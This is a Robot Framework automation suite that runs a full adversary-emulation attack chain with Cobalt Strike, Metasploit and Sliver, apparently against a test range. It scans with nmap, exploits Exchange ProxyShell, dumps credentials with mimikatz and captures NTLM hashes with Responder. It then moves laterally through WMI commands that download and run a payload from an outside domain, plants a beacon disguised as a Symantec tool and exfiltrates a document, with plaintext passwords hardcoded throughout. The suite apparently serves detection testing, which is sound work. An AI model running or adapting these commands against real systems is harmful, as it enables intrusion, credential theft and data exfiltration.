*** Settings ***
Documentation       BAQT Automated Workflow
Library             cobaltstrike.C2Keywords
Library             LogLibrary.py
Library             OperatingSystem 
Library             DateTime
Library             SSHLibrary    #timeout=1 day
Library             Process
Library             sliverc2.SliverRobotLibrary
Library             random

Suite Setup       Setup C2 Environment
...               ip=${CS_IP}
...               user=${CS_USER}
...               password=${CS_PASS}    
...               cs_dir=${CS_DIR}
...               port=${CS_PORT}
...               data_dir=${ARTIFACT_DIR}
...               debug=${DEBUG_MODE}
...               sudo_password=P@ssw0rd
...               startup_script=/home/bah/baqt/start_teamserver.sh

#Suite Teardown    Teardown C2 Environment

Suite Teardown     Ending Remarks

*** Variables ***
# UPDATED: Changed from MOD to DI network infrastructure
${CS_IP}          31.148.54.96       # TARGET IP FOR C2 SERVER
${CS_USER}        bah
${CS_PASS}        P@ssw0rd
${CS_DIR}         /opt/cobaltstrike
${CS_PORT}        50050
${SUDO_NEEDED}    ${False}              # Set to ${False} if sudo setup isn't required/handled externally
${verify_String}           Are you sure you want to continue connecting
${password_string}          password:

${ARTIFACT_DIR}    ./baqt_artifacts       # Directory for payloads relative to execution
${ARTIFACT_DIR_BACKUP}    ./baqt_artifacts_backup      # Directory for payloads relative to execution
${DEBUG_MODE}      ${True}

${HTTP_LISTENER_NAME}    AWSAuthService
${SMB_LISTENER_NAME}     http_awsauthservice
${HTTP_LISTENER_OPTS}    host="${CS_IP}";port=80;beacons="${CS_IP}"  # Semicolon separated for keyword
${SMB_LISTENER_OPTS}     port="rf_pipe_9e"

# UPDATED: Changed from MOD network (195.130.70.x) to DI network (151.102.64.x)
${TARGET_INITIAL_IP}     151.102.64.6         # DI-EX (was 195.130.70.5 MOD-EX)
${TARGET_DC_IP}          151.102.64.5         # DI-DC (was 195.130.70.1 MOD-DC)  
${TARGET_WEB_IP}         151.102.64.8         # DI-WEB (was 195.130.70.15 MOD-WEB)
${TARGET_LAT_MOVE_IP}    151.102.64.5         # Updated from 195.130.70.1
${BRUTE_FORCE_IP}        151.102.65.57
${DI_W10_5}           151.102.65.144
${DI_W10_3}              151.102.65.142
${DI_W11_5}              151.102.65.57
${DI_W10_4}              151.102.65.143
${ROUTER_IP}             151.102.65.1

${PAYLOAD_ARCH}          both           # x86, x64, or both
${PAYLOAD_TYPES}         exe            # exe,dll,ps1 etc.
${BEACON_TIMEOUT}        2m             # Wait up to 2 minutes for beacon

# UPDATED: Changed domain from mod.gov.gk to di.gov.gk
${TARGET_DOMAIN}         di.gov.gk             # Was mod.gov.gk
${TARGET_EMAIL}          Administrator@di.gov.gk    # Was Administrator@mod.gov.gk

# UPDATED: DI network lateral movement targets with new credentials
${LAT_MOVE_TARGETS}      151.102.65.144,151.102.65.142,151.102.65.57  # New DI network targets
${LAT_MOVE_CREDS}        DI\\rodrigo.allison:r4#Sw5GyL+5V,DI\\shelia.serrano:xI#Yp6@4#8o#,DI\\eduardo.wheeler:bL+6oA6P@W+x

# AC2 Variables - UPDATED for DI network
${DOCUMENTS_PATH}     C:\\Users\\fannie.sparks\\Documents
${REMOTE_FILE}        C:\\Users\\fannie.sparks\\Documents\\GK_DEFINTEL_ProjectHelios_TechOverview.docx
${LOCAL_FILE}         ${ARTIFACT_DIR}/GK_DEFINTEL_ProjectHelios_TechOverview.docx

${ROGUE_USER}         Administrator
${ROGUE_HOST}         127.0.0.1
${ROGUE_PORT}         2222
${ROGUE_PASS}         P@ssw0rd
${RESP_IFACE}         ens33

# UPDATED: Changed DC IP from 151.102.65.143 to match DI network
${DC_IP}              151.102.65.142         # Target for AC2 operations
${SHARE_HOST}         31.148.54.96          # Updated from 122.10.25.45 to match new setup
${SHARE_NAME}         share
${LOCAL_USER}         fannie.sparks
${USER_PASS}          Y@Au#5RpKb@8          # May need updating based on new creds
${USER_PORT}          8022

${LOG_FILENAME}          baqt1.csv

${EVAL_HOST}        31.148.54.97
${EVAL_USERNAME}    bah
${EVAL_PASSWORD}    P@ssw0rd

${REMOTE_IOC_FILE_PATH}          /home/bah/Desktop/baqt1_ioc.html
${LOCAL_IOC_FILE_PATH}           /home/bah/baqt/process_logs/baqt1_ioc.html

${REMOTE_PROCESSES_FILE_PATH}    /home/bah/Desktop/baqt1_process.html
${LOCAL_PROCESSES_FILE_PATH}     /home/bah/baqt/process_logs/baqt1_process.html

${test}              0

# UPDATED: Changed packet capture destination IP to match single interface
${packet_dest_ip}       175.100.2.30         # Was 175.100.1.50, now matches single capture setup

${ARP_SPOOF_SCRIPT}    ./start_arp_spoof.sh
${SSH_BRUTESIM_SCRIPT}    ./ssh_brute_sim.sh

*** Keywords ***

Ending Remarks
    Log To Console     \n--- BAQT Workflow Completed ---
    ${current_time}=    Get Current Date    result_format=%Y-%m-%d %H:%M:%S
    Log To Console      Ending orchestration time: ${current_time}    console=True
    Log To Console      Saving logs to process sheets in process_logs
    Log It    ${LOG_FILENAME}    ATTACK CHAIN Completed
    Render Html         ${LOG_FILENAME}
    SCP Transfer

SCP Transfer
    Log To Console     \nTransfering Logs to evaluation machine
    
    Open Connection    ${EVAL_HOST}
    Login    ${EVAL_USERNAME}    ${EVAL_PASSWORD}
    
    Put File    ${LOCAL_IOC_FILE_PATH}          ${REMOTE_IOC_FILE_PATH}
    Put File    ${LOCAL_PROCESSES_FILE_PATH}    ${REMOTE_PROCESSES_FILE_PATH}
    
    Close Connection

Get Local Terminal
    [Arguments]    ${host}  ${username}   ${password}    ${alias}
    Open Connection     ${host}     alias=${alias}   escape_ansi=True    timeout=300s
    Login    ${username}    ${password}   

Get Remote Terminal
    [Arguments]    ${host}  ${username}   ${password}    ${alias}
    Open Connection     ${host}     alias=${alias}   escape_ansi=True    timeout=300s
    Login    ${username}    ${password}  

Connect To Capture Server
    # UPDATED: Changed to match single interface setup
    Create Local SSH Tunnel    local_port=8022    remote_host=175.100.2.30    remote_port=22    #bind_address=175.100.2.28
    
Start Packet Capture
    [Arguments]    ${cap_name}    ${cap_file_name}
    Switch Connection       capture
    Sleep    20s
    Log To Console    \nStarting ${cap_name} Capture
    # UPDATED: Changed from Ethernet5 to Ethernet4 to match single interface setup
    Start Command                   "C:\\Program Files\\Wireshark\\tshark.exe" -i Ethernet4 -w C:\\CaptureShare\\${cap_file_name}.pcap
    Switch Connection    local

Stop Packet Capture
    # Remove this
    #Pass Execution    No capture for testing
    Switch Connection    capture
    Start Command    powershell -command "Stop-Process -Name 'dumpcap' -Force"
    Switch Connection    local

Command Pause
    IF    ${test} == 1
        VAR    ${pause}    10
    ELSE
        ${pause}    Evaluate    random.randint(45, 120)
    END

    Log To Console    Pausing between commands for ${pause} seconds.
    Sleep    ${pause}

Stage Pause
    IF    ${test} == 1
        VAR    ${pause}    10
    ELSE
        ${pause}=    Evaluate    random.randint(1800, 3600)
    END
    
    Log To Console    Pausing between stages for ${pause} seconds.
    Sleep    ${pause}

Shift Pause
    IF    ${test} == 1
        VAR    ${pause}    10
    ELSE
        ${pause}=    Evaluate    random.randint(28800, 43200)
    END
    
    Log To Console    Pausing between shifts for ${pause} seconds.
    Sleep    ${pause}

Launch MSFConsole
    Log To Console      \nStarting msfconsole
    Write    msfconsole
    ${results}    Read      delay=10s
    ${results}    Read
    Sleep       20s     Waiting for msfconsole to load
    Log To Console      \nLoading MSGRPC Server
    Write    load msgrpc Pass\=P@ssw0rd ServerPort\=55555
    Read Until    Successfully loaded plugin: msgrpc
    Log To Console      \nMSGRPC Server Loaded

*** Test Cases ***
#Debug Python Path
##    Import Library    sys
#    ${python_path}=    Evaluate    sys.path
#    Log To Console    Python path: ${python_path}


BAQT AC1 Execution Information
    Log To Console      \n--- BAQT AC1 Workflow ---
    Log To Console      Initial Attack Chain...
    ${current_time}=    Get Current Date    result_format=%Y-%m-%d %H:%M:%S
    Log To Console      Starting orchestration time: ${current_time}    console=True
    Log It          ${LOG_FILENAME}        ATTACK CHAIN - Beginning BAQT Tests 

BAQT_AC1
    #Pass Execution    \nTesting AC2 only
    Log To Console    \nStarting Cobalt Strike TTPs, creating listeners...
    Create CS Listener    name=${HTTP_LISTENER_NAME}    type_name=Beacon_HTTP    options_str=${HTTP_LISTENER_OPTS}

    Log To Console    \nCreating payloads...
    Create CS Payload     types=${PAYLOAD_TYPES}    architectures=${PAYLOAD_ARCH}    output_dir=${ARTIFACT_DIR}

    Log To Console      \nConnecting to local terminal
    Get Local Terminal    127.0.0.1   bah    P@ssw0rd    local

    Log To Console    \nCreating SSH tunnel to capture share
    Connect To Capture Server    # Creates SSH Tunnel
    # UPDATED: Changed capture server connection to match new setup
    Get Remote Terminal    175.100.2.30    rangetech    P@ssw0rdP@ssw0rd    capture

    Log To Console    \nStarting packet capture for Common Scan
    Start Packet Capture    Common Scan    baqt1_common_scan

    Log To Console    \nRunning Reconnaissance ...
    Switch Connection    local
    # UPDATED: Changed from mod.gov.gk to di.gov.gk
    Write   dig MX ${TARGET_DOMAIN}
    Command Pause
    # UPDATED: Changed target IP from 195.130.70.5 to 151.102.64.6
    Set CLient Configuration      timeout=1200s
    Write   sudo nmap -sV -sC -O ${TARGET_INITIAL_IP}
    Read Until      password
    Write   P@ssw0rd
    Command Pause
#    # UPDATED: Changed network range from 195.130.70.0/24 to 151.102.64.0/24
    Write   sudo nmap -sV 151.102.64.0/24 > /home/bah/Desktop/pingportsweep.txt
    Command Pause
    # UPDATED: Changed target IP for traceroute
    Write   traceroute ${TARGET_INITIAL_IP} > /home/bah/Desktop/udproute.txt
    Read Until      Nmap done:
    Command Pause
    Log To Console      \nNmap complete
    # UPDATED: Changed IOC description to reflect DI network
    Log It    ${LOG_FILENAME}    Recon: Common scan capture; dig MX ${TARGET_DOMAIN}; sudo nmap -sV -sC -O ${TARGET_INITIAL_IP}; sudo nmap -sV 151.102.64.0/24 > /home/bah/Desktop/pingportsweep.txt; traceroute ${TARGET_INITIAL_IP} > /home/bah/Desktop/udproute.txt    machine=${TARGET_INITIAL_IP}    ioc=${empty}     tid=T1595.003,T1595.002
    Sleep       20s

    Stop Packet Capture

    Stage Pause

    Start Packet Capture    Initial Access    baqt1_initial_access

    Log To Console    \nRunning Initial Access ...
    Log to Console      \nStarting Metasploit Framework RPC Server
    Launch MSFConsole

    Log to Console      \nInitiating Initial Access
    Import Library      BAQT_MSF.py
    Initial Access
    Log It    ${LOG_FILENAME}    Initial Access: ProxyShell RCE exploit;use exploit/windows/http/exchange_proxyshell_rce; set RHOSTS ${TARGET_INITIAL_IP}; set EMAIL ${TARGET_EMAIL}; set payload windows/x64/meterpreter/bind_tcp; run    machine=151.102.64.6   ioc=Exchange Administrator account configured for Mailbox Import Export role     tid=T1190
    Log It    ${LOG_FILENAME}    Upload executable to target through metsploit console; upload AWSAuthService.exe    ${TARGET_INITIAL_IP}     ioc="AWSAuthService.exe locatioed at C:\\Windows\\System32"    tid=T1105
    Log It    ${LOG_FILENAME}    execute executable on target through metsploit console; execute AWSAuthService.exe    ${TARGET_INITIAL_IP}     ioc="AWSAuthService.exe running on ${TARGET_INITIAL_IP}"    tid=T1059.003
    Log To Console    \n ${ARTIFACT_DIR}/${HTTP_LISTENER_NAME}.exe executing on a target machine, please wait... 
    # UPDATED: Changed machine reference and IOC details for DI network
    #Log It    ${LOG_FILENAME}    Initial Access: ProxyShell RCE exploit    machine=udg-kali-1    ioc="use exploit/windows/http/exchange_proxyshell_rce; set RHOSTS ${TARGET_INITIAL_IP}; set EMAIL ${TARGET_EMAIL}; set payload windows/x64/meterpreter/bind_tcp; run; upload AWSAuthService.exe; execute AWSAuthService.exe"    tid="T1190,T1105,T1059.001"
    # UPDATED: Changed expected beacon IP
    ${beacon_id}=     Wait For Beacon Checkin With Specific Ip    ${TARGET_INITIAL_IP}    timeout=${BEACON_TIMEOUT}    # Wait for a beacon from DI-EX
    Log It    ${LOG_FILENAME}    established Cobalt Strike Beacon    ${TARGET_INITIAL_IP}     ioc="C2 connection on ${TARGET_INITIAL_IP}    tid=T1071.001

    ################# Quit out of Metasploit #############
    #Switch Connection       local
   ## Write                   quit  
   # ${output}               Read     delay=3s
   # Log To COnsole          ${output}

    ############################# 
    # UPDATED: Changed log message to reflect DI-EX instead of MOD-EX
    Stage Pause
    Log To Console    \nGot Beacon ${beacon_id} from ${TARGET_INITIAL_IP} - DI-EX
    Set Active Beacon    ${beacon_id}
    Sleep    10s

    Log To Console    \nRunning Discovery...

    Switch Connection    local
    Run Command       ipconfig /all
    Log It    ${LOG_FILENAME}    Running ipconfig /all on ${TARGET_INITIAL_IP}    ${TARGET_INITIAL_IP}     ioc=${empty}     tid=T1016
     Command Pause
    Dump Credentials    
    Log It    ${LOG_FILENAME}    Running mimikatz on ${TARGET_INITIAL_IP}    ${TARGET_INITIAL_IP}     ioc=${empty}        tid=T1003.001
     Command Pause
    Net Domain Controllers
    #Run Command       net domain_controllers
    Log It    ${LOG_FILENAME}    Running net domain_controllers on ${TARGET_INITIAL_IP}    ${TARGET_INITIAL_IP}     ioc=${empty}        tid=T1018
 
    Stop Packet Capture
    Stage Pause

    Start Packet Capture    Man in the Middle    baqt1_mitm
    
    Log To Console    Start MITM with Responder
    Open Connection    ${ROGUE_HOST}    port=${ROGUE_PORT}    alias=rogue
    Login              ${ROGUE_USER}    ${ROGUE_PASS}
    Command Pause
    Write     sudo ~/Responder/Responder.py -I ${RESP_IFACE} -Pv
    Set Client Configuration    timeout=1 day
    Read Until      [sudo] password for Administrator: 
    Command Pause
    Write           ${ROGUE_PASS} 
    Log To Console      \n\n [*] Responder.py started, waiting for UE to kick off listener. 
    Log To Console      [*] Proceeding once fannie.sparks hash is returned.\n
    ${re}=          Read Until     fannie    
   #${re}=          Read Until      [+] 
    Log To Console     \nFannie Sparks hash line: ${re}
    Log It    ${LOG_FILENAME}    Adversary-in-the-middle; NTLM Hash Captured;Authentication Interception;User: fannie.sparks;Domain: DI    machine=${DI_W10_4}    ioc=${empty}     tid=T1557-001
    Close Connection

    Stop Packet Capture

    Stage Pause

    Shift Pause



   Start Packet Capture    Lateral Movement    baqt1_lateral_movement

    # UPDATED: Changed machine reference from MOD-EX to DI-EX
    Log To Console    \nRunning Lateral Movement...
    # UPDATED: Changed target IP and credentials for DI-DC
   ${beacon_id}=     Wait For Beacon Checkin With Specific Ip    ${TARGET_INITIAL_IP}    timeout=${BEACON_TIMEOUT}    # Wait for a beacon from DI-EX
   Set Active Beacon    ${beacon_id}
    Run Command      wmic /node:"${TARGET_DC_IP}" /user:"DI\\Administrator" /password:"P@ssw0rd" process call create "cmd.exe /c powershell -nop -w hidden -c \\"Invoke-WebRequest -Uri \\'http://amazonauth.com:80/download/AWSAuthService.exe\\' -OutFile \\'C:\\Windows\\AWSAuthService.exe\\'; Start-Process \\'C:\\Windows\\AWSAuthService.exe\\'\\""
    Log It    ${LOG_FILENAME}    Lateral Movement - Remote execution via WMI with credentails;executing command on ${TARGET_INITIAL_IP};wmic /node:"${TARGET_DC_IP}" /user:"DI\\Administrator" /password:"P@ssw0rd" process call create "cmd.exe /c powershell -nop -w hidden -c "Invoke-WebRequest -Uri 'http://amazonauth.com:80/download/AWSAuthService.exe' -OutFile 'C:\\Windows\\AWSAuthService.exe'; Start-Process 'C:\\Windows\\AWSAuthService.exe'""    ${TARGET_INITIAL_IP}     ioc="AWSAuthService.exe located at C:\\Windows on ${TARGET_DC_IP};Process AWSAutheService running on ${TARGET_DC_IP}"      tid=T1047, T1059.003
    Command Pause
    # UPDATED: Changed expected beacon IP and log message
    Log To Console      \nGrabbing DI-DC Beacon
    ${beacon_id}=    Wait For Beacon Checkin With Specific Ip    ${TARGET_DC_IP}    timeout=${BEACON_TIMEOUT}   # Wait for a beacon from DI-DC
    Log To Console      \nGot Beacon ${beacon_id} from ${TARGET_DC_IP} - DI-DC
    Set Active Beacon    ${beacon_id}
    Dump Credentials 
    Log It    ${LOG_FILENAME}    Running mimikatz on ${TARGET_DC_IP}    ${TARGET_DC_IP}     ioc=${empty}       tid="T1003.001"
    Command Pause
    Run Command      net computers    
    Log It    ${LOG_FILENAME}    Running System Network Discovery; running Cobalt Strike "net" command on ${TARGET_DC_IP}    ${TARGET_DC_IP}     ioc=${empty}     tid="T1016"
    Command Pause
    # UPDATED: Changed target IPs and credentials for DI network lateral movement
    Run Command      wmic /node:"151.102.65.144" /user:"DI\\rodrigo.allison" /password:"r4#Sw5GyL+5V" process call create "cmd.exe /c powershell -nop -w hidden -c \\"Invoke-WebRequest -Uri \\'http://amazonauth.com:80/download/AWSAuthService.exe\\' -OutFile \\'C:\\Windows\\AWSAuthService.exe\\'; Start-Process \\'C:\\Windows\\AWSAuthService.exe\\'\\""
    Log It    ${LOG_FILENAME}    Lateral Movement - Remote execution via WMI with credentails;executing command on ${TARGET_DC_IP};wmic /node:"${DI_W10_5}" /user:"DI\\Arodrigo.allison" /password:"r4#Sw5GyL+5V" process call create "cmd.exe /c powershell -nop -w hidden -c "Invoke-WebRequest -Uri 'http://amazonauth.com:80/download/AWSAuthService.exe' -OutFile 'C:\\Windows\\AWSAuthService.exe'; Start-Process 'C:\\Windows\\AWSAuthService.exe'""    ${DI_W10_5}     ioc="AWSAuthService.exe located at C:\\Windows on ${DI_W10_5};Process AWSAutheService running on ${DI_W10_5}"       tid=T1047, T1059.003
    Command Pause
    Run Command      wmic /node:"151.102.65.142" /user:"DI\\shelia.serrano" /password:"xI#Yp6@4#8o#" process call create "cmd.exe /c powershell -nop -w hidden -c \\"Invoke-WebRequest -Uri \\'http://amazonauth.com:80/download/AWSAuthService.exe\\' -OutFile \\'C:\\Windows\\AWSAuthService.exe\\'; Start-Process \\'C:\\Windows\\AWSAuthService.exe\\'\\""
    Log It    ${LOG_FILENAME}    Lateral Movement - Remote execution via WMI with credentails;executing command on ${TARGET_DC_IP};wmic /node:"${DI_W10_5}" /user:"DI\\shelia.serrano" /password:"xI#Yp6@4#8o#" process call create "cmd.exe /c powershell -nop -w hidden -c "Invoke-WebRequest -Uri 'http://amazonauth.com:80/download/AWSAuthService.exe' -OutFile 'C:\\Windows\\AWSAuthService.exe'; Start-Process 'C:\\Windows\\AWSAuthService.exe'""    ${DI_W10_3}     ioc="AWSAuthService.exe located at C:\\Windows on ${DI_W10_3};Process AWSAutheService running on ${DI_W10_3}"       tid=T1047, T1059.003
    Command Pause
    Run Command      wmic /node:"151.102.65.57" /user:"DI\\eduardo.wheeler" /password:"bL+6oA6P@W+x" process call create "cmd.exe /c powershell -nop -w hidden -c \\"Invoke-WebRequest -Uri \\'http://amazonauth.com:80/download/AWSAuthService.exe\\' -OutFile \\'C:\\Windows\\AWSAuthService.exe\\'; Start-Process \\'C:\\Windows\\AWSAuthService.exe\\'\\""
    Log It    ${LOG_FILENAME}    Lateral Movement - Remote execution via WMI with credentails;executing command on ${TARGET_DC_IP};wmic /node:"${DI_W10_5}" /user:"DI\\eduardo.wheeler" /password:"bL+6oA6P@W+x" process call create "cmd.exe /c powershell -nop -w hidden -c "Invoke-WebRequest -Uri 'http://amazonauth.com:80/download/AWSAuthService.exe' -OutFile 'C:\\Windows\\AWSAuthService.exe'; Start-Process 'C:\\Windows\\AWSAuthService.exe'""    ${DI_W11_5}     ioc="AWSAuthService.exe located at C:\\Windows on ${DI_W11_5};Process AWSAutheService running on ${DI_W11_5}"       tid=T1047, T1059.003
    Command Pause
    Run Command      wmic /node:"${TARGET_WEB_IP}" /user:"DI\\Administrator" /password:"P@ssw0rd" process call create "cmd.exe /c powershell -nop -w hidden -c \\"Invoke-WebRequest -Uri \\'http://amazonauth.com:80/download/AWSAuthService.exe\\' -OutFile \\'C:\\Windows\\AWSAuthService.exe\\'; Start-Process \\'C:\\Windows\\AWSAuthService.exe\\'\\""
   Log It    ${LOG_FILENAME}    Lateral Movement - Remote execution via WMI with credentails;executing command on ${TARGET_DC_IP};wmic /node:"${DI_W10_5}" /user:"DI\\Administrator" /password:"P@ssw0rd" process call create "cmd.exe /c powershell -nop -w hidden -c "Invoke-WebRequest -Uri 'http://amazonauth.com:80/download/AWSAuthService.exe' -OutFile 'C:\\Windows\\AWSAuthService.exe'; Start-Process 'C:\\Windows\\AWSAuthService.exe'""    ${TARGET_WEB_IP}     ioc="AWSAuthService.exe located at C:\\Windows on ${DI_W11_5};Process AWSAutheService running on ${TARGET_WEB_IP}"       tid=T1047, T1059.003
    Command Pause
    # UPDATED: Changed expected beacon IP and log message
    Log To Console      \nGrabbing DI-WEB Beacon
    ${beacon_id}=    Wait For Beacon Checkin With Specific Ip    ${TARGET_WEB_IP}    timeout=${BEACON_TIMEOUT}    # Wait for a beacon from DI-WEB
    Log To Console      \nGot Beacon ${beacon_id} from ${TARGET_WEB_IP} - DI-WEB
    Set Active Beacon    ${beacon_id}
    # UPDATED: Changed machine references and IPs in IOC
    
    Stop Packet Capture

    Stage Pause

 
 
 #   Log To Console     \n--- BAQT AC1 Workflow Completed ---
 #   ${current_time}=    Get Current Date    result_format=%Y-%m-%d %H:%M:%S
 #   Log To Console      Ending orchestration time: ${current_time}    console=True
 #   Log To Console      Saving logs to process sheets in process_logs
 #   Log It    ${LOG_FILENAME}    ATTACK CHAIN - BAQT_AC1 Tests Completed    ioc=Attack Chain Complete;Successful Test Execution    machine=Operator Host    tid=TID-3899
    
 # NOTE: AC2 has been integrated into the main attack chain in the manual execution
# The code below represents the legacy AC2 structure that may need consolidation

#BAQT AC2 Execution Information
#    Log To Console      \n--- BAQT AC2 Workflow ---
#    Log To Console      Secondary AC which utilizes backdoor access to perform AD enumeration, Ubuntu system compromise, and establishes ARP spoofing to intercept subnet traffic.
#    ${current_time}=    Get Current Date    result_format=%Y-%m-%d %H:%M:%S
#    Log To Console      \nStarting orchestration time: ${current_time}    console=True
#    Log It              ${LOG_FILENAME}    ATTACK CHAIN - Beginning BAQT_AC2 Tests    ioc=Attack Chain Step 1

 

    #Start Packet Capture    NMAP    nmap_scan

    #Log To Console    NMAP Scan
    Open Connection    ${ROGUE_HOST}    port=${ROGUE_PORT}    alias=rogue
    Login              ${ROGUE_USER}    ${ROGUE_PASS}
    Write              sudo nmap -sV -O 151.102.65.143              #${DC_IP}   
    Read Until         [sudo] password for Administrator: 
    Command Pause
    Write              ${ROGUE_PASS} 
    Set Client Configuration           timeout=15m
    ${re}=             Read Until      Network
    Log To Console     NMAP Output: ${re}
    Log It    ${LOG_FILENAME}    Network Service Discovery; Execute nmap -sV -O 151.102.65.143    machine=${DI_W10_4}    ioc=${empty}    tid=T1046
    Close Connection

    #Stop Packet Capture

    Stage Pause

 
 #TestSliver


#    Log To Console      \nConnecting to local terminal
#    Get Local Terminal    127.0.0.1   bah    P@ssw0rd    local

#    Log To Console    \nCreating SSH tunnel to capture share
#    Connect To Capture Server    # Creates SSH Tunnel
    # UPDATED: Changed capture server connection to match new setup
#    Get Remote Terminal    175.100.2.30    rangetech    P@ssw0rdP@ssw0rd    capture



    Log To Console    Preparing Sliver DNS
    Setup Sliver Environment
    
 
    Start Packet Capture    Copy Files    baqt1_copy_files

    Log To Console    Mount Share & Copy Files
    Open Connection    ${DI_W10_3}       alias=sparks            newline=CRLF      escape_ansi=True
    Login              ${LOCAL_USER}    ${USER_PASS}
    Set CLient Configuration      timeout=10m
     ${output1}=        Execute Command    net use S: \\\\${SHARE_HOST}\\${SHARE_NAME}    timeout=60s
    Log To Console     Net use output: ${output1}
    Log It    ${LOG_FILENAME}    Mounted network share for payload transfer    machine=${DC_IP}    ioc=Mounted Share;Path: \\\\${SHARE_HOST}\\${SHARE_NAME};Drive: S:    tid=T1021.002
    Command Pause

    # UPDATED: Changed filename from SymantecMonitor.exe to SymantecSysMonitor.exe to match execution
    Start Command      copy S:\\SymantecSysMonitor.exe C:\\Windows\\System32\\
    ${output2}=        Read Command Output    timeout=60s
    Log To Console     Copy output: ${output2}
    # UPDATED: Updated IOC to reflect correct filename
    Log It    ${LOG_FILENAME}    Copied DNS beacon payload to target system    machine=${DC_IP}    ioc=File Copy;Malware Implant;Masqueraded As: SymantecSysMonitor.exe;Destination: C:\\Windows\\System32\\    tid=T1021.002
    Command Pause

   Stop Packet Capture

    # UPDATED: Changed executable name in scheduled task to match execution
    #${sched_cmd}=      Set Variable    powershell -Command "Register-ScheduledTask -TaskName 'RunSymantecSysMonitor' -Action (New-ScheduledTaskAction -Execute 'C:\\Windows\\System32\\SymantecSysMonitor.exe') -Principal (New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest) -Trigger (New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(5)) -Force; Start-ScheduledTask -TaskName 'RunSymantecSysMonitor'"
    #${output3}=        Execute Command    ${sched_cmd}
    #Log To Console     Process started with PID: ${output3}
    # UPDATED: Updated task name in IOC
   # Log It    ${LOG_FILENAME}    Established persistence via scheduled task    machine=${DC_IP}    ioc=Scheduled Task Creation;Task Name: RunSymantecSysMonitor;Elevated Privileges: SYSTEM;Persistence Mechanism    tid=TID-0005
    #Command Pause

    Sleep              2s
    Switch Connection     sparks
    Close Connection
 
    Stage Pause



    Start Packet Capture    DNS Beacon    baqt1_dns_beacon

    Log To Console    Establish Connection And Get Beacon
    #Log It    ${LOG_FILENAME}    Connecting to C2 server    machine=Operator Host    ioc=C2 Connection Attempt    tid=TID-0007
     Open Connection    ${DI_W10_3}       alias=sliver            newline=CRLF      escape_ansi=True
    Login              ${LOCAL_USER}    ${USER_PASS}
 #  Write       C:\\Windows\\System32\\SymantecSysMonitor.exe
  #  ${output}=     Read     delay=5s
  #  Log To Console       executing SymantecSysMonitor.exe: ${output}
 #   ${sched_cmd}=      Set Variable    powershell -Command "Register-ScheduledTask -TaskName 'RunSymantecMonitor' -Action (New-ScheduledTaskAction -Execute 'C:\\Windows\\System32\\SymantecMonitor.exe') -Principal (New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest) -Trigger (New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(5)) -Force; Start-ScheduledTask -TaskName 'RunSymantecMonitor'"
 #   ${output3}=        Execute Command    ${sched_cmd}
 #   Log To Console     Process started with PID: ${output3}
    Write           C:\\Windows\\System32\\SymantecSysMonitor.exe
    ${output}     Read    delay=5s
    Log To Console        ${output}
    #${output2}=        Read Command Output    timeout=60s
    #Log To Console     Copy output: ${output2}
   #sleep          120s
    Connect To C2 Server
    sleep      20s
    ${result}=        Get First Available Beacon
    Should Be True    ${result}
    Log It    ${LOG_FILENAME}    Execute command on target;C:\\Windows\\System32\\SymantecSysMonitor.exe;Established DNS beacon for C2    machine=${DC_IP}    ioc=Beacon Established;Process SymantecSysMonitor running on ${DC_IP}    tid="1071.004"
    Command Pause

    #Log To Console    Change Directory
    #Log To Console    Changing directory to: ${DOCUMENTS_PATH}
    Log To Console    Enumerating Documents Directory
    ${result}=        List Directory At Path    ${DOCUMENTS_PATH}
    Log To Console    ${result}
    Log It    ${LOG_FILENAME}    Enumerated user documents directory    machine=${DC_IP}    ioc=${empty}     tid=T1059.003
    Command Pause

 #   Log To Console    List Files On Target System
 #   ${document_contents}=    List Current Directory
 #   Log To Console    ${document_contents}
 #   Command Pause
 #   ${document_contents}=    List Directory At Path    ${DOCUMENTS_PATH}
 #   Log To Console    ${document_contents}
 #   Command Pause
 #   Log It    ${LOG_FILENAME}    Identified files of interest    machine=${DC_IP}    ioc=Target File Found;File: GK_DEFINTEL_ProjectHelios_TechOverview.docx;Location: ${DOCUMENTS_PATH}    tid=TID-0009
     Command Pause

    Log To Console    Download File From Target
    Command Pause

    ${success}=       Download Remote File    ${REMOTE_FILE}    ${LOCAL_FILE}
    Should Be True    ${success}
    Command Pause

    Log It    ${LOG_FILENAME}    Successfully exfiltrated file from target;File: GK_DEFINTEL_ProjectHelios_TechOverview.docx;Location: ${DOCUMENTS_PATH}   machine=${DC_IP}    ioc=${empty}     tid=T1041

    Command Pause

    Stop Packet Capture

    Stage Pause
    Shift Pause
#
    #Cleanup Sliver Environment
 
#LastStage

 #   Get Local Terminal    127.0.0.1   bah    P@ssw0rd    local

 #   Connect To Capture Server    # Creates SSH Tunnel
    # UPDATED: Changed capture server connection to match new setup
 #   Get Remote Terminal    175.100.2.30    rangetech    P@ssw0rdP@ssw0rd    capture
    Log To Console    Running Nltest & Nslookup
    #Open Connection    ${DC_IP}    port=${USER_PORT}    alias=sparks             newline=CRLF      escape_ansi=True
    Open Connection    ${DC_IP}       alias=sparks            newline=CRLF      escape_ansi=True
    Login              ${LOCAL_USER}    ${USER_PASS}
     Switch Connection       sparks
    Login              ${LOCAL_USER}    ${USER_PASS} 
    ${output}=        Execute Command    nltest /DCLIST:DI
    Log To Console     ${output}
    Log It     ${LOG_FILENAME}    Command and Scripting Interpreter: Windows Command Shell; Issued command nltest /DCLIST:DI        machine="${DC_IP}      ioc=${empty}         tid="1059.003
    Command Pause
    Log To Console     NLTEST output: ${output}
    # UPDATED: Changed nslookup target from di-dc.di.gov.gk to match execution
    Start Command      nslookup di-dc.di.gov.gk
    Log It     ${LOG_FILENAME}    Command and Scripting Interpreter: Windows Command Shell; Issued command nslookup di-dc.di.gov.gk        machine="${DC_IP}      ioc=${empty}         tid=T1059.003
     Command Pause
    ${output2}=        Read Command Output    timeout=30s
    Log To Console     NSLOOKUP output: ${output2}
    Close Connection

    #Stop Packet Capture

    Stage Pause

    #Start Packet Capture    New Domain Admin    new_domain_admin

    Log To Console    Create New Domain Admin
    # UPDATED: Changed connection target to match execution (151.102.64.5)
    #Open Connection    ${ROGUE_HOST}    port=${ROGUE_PORT}    alias=rogue
    #Login              ${ROGUE_USER}    ${ROGUE_PASS}
    Get Local Terminal    127.0.0.1   bah    P@ssw0rd    newUser
    Write              ssh -p 2222 Administrator@localhost
     Command Pause   
    #Open Connection    151.102.64.5      alias=sparks      newline=CRLF      escape_ansi=True
